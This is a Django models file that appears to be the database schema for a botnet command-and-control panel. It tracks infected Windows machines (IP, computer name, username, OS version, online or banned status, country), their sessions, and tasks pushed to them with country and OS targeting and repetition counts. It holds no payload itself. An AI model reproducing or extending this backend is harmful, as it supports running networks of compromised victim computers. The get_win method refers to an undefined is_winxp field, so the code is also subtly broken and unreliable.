from django.db import models


class Bot(models.Model):
    ip = models.CharField(max_length=100, default='')

    uid = models.CharField(max_length=100)
    computername = models.CharField(max_length=100)
    username = models.CharField(max_length=100)

    is_win7 = models.BooleanField(default=False)
    is_win81 = models.BooleanField(default=False)
    is_win8 = models.BooleanField(default=False)
    is_win10 = models.BooleanField(default=False)
    is_win11 = models.BooleanField(default=False)

    is_server2012 = models.BooleanField(default=False)
    is_server2012r2 = models.BooleanField(default=False)

    is_online = models.BooleanField(default=False)
    is_banned = models.BooleanField(default=False)

    is_x64 = models.BooleanField(default=False)
    is_server = models.BooleanField(default=False)

    date = models.DateTimeField(auto_now_add=True)
    date_ch = models.DateTimeField(auto_now=True)

    comment = models.CharField(max_length=200, default='')

    c = models.CharField(max_length=1, default='1')

    country = models.CharField(max_length=10)

    tasks = models.ManyToManyField('Task')

    objects = models.Manager()

    def get_win(self):
        win = [_ for _ in [self.is_win8, self.is_win7, self.is_win10, self.is_win11, self.is_winxp] if _]
        return win[0]

    class Meta:
        ordering = ['-date']


class Session(models.Model):
    uid = models.CharField(max_length=100)
    ip_port = models.CharField(max_length=50)
    connection_type = models.CharField(max_length=50)
    is_active = models.BooleanField(default=True)

    objects = models.Manager()


class Task(models.Model):
    name = models.CharField(max_length=150)
    country = models.CharField(max_length=20)

    repetitions = models.IntegerField()
    done = models.IntegerField()

    type1 = models.CharField(max_length=20)

    winos = models.CharField(max_length=100)
    xoc = models.CharField(max_length=50)

    date = models.DateTimeField(auto_now_add=True)

    completed = models.BooleanField(default=False)

    class Meta:
        ordering = ['-date']


    objects = models.Manager()

    def __str__(self):
        return f'{self.name} --- {self.winos}'